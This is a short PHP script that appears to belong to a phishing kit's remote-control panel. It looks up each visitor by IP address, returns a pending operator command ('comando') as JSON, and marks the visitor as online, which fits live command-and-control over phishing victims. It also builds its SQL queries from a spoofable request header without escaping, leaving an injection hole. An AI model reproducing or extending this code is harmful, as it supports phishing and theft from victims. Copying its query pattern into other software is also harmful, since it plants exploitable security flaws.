<?php

session_start();
error_reporting(0);

require_once "../cod3rconfig/registro.php";
require_once "../cod3rconfig/conexao.php";
require_once "../cod3rconfig/data.php";
require_once "../bot.php";

$ip            = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
$query_info    = "SELECT * FROM infos WHERE ip = '$ip'"; 
$recorinfo     = mysqli_query(DBConnect(), $query_info) or die(mysqli_error(DBConnect()));
$row_infio     = mysqli_fetch_assoc($recorinfo); 
$totalRowsinfo = mysqli_num_rows($recorinfo);

$comando       = $row_infio['statusremote'];




	 
   $ok = array("comando"=> "$comando");
  //faz o parsing na string, gerando um objeto PHP
   echo $obj = json_encode($ok);
		
	


$tempo    = time();
$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET tempo = '$tempo', minuto = '0', status = 'Online' WHERE ip = '$ip'");

?>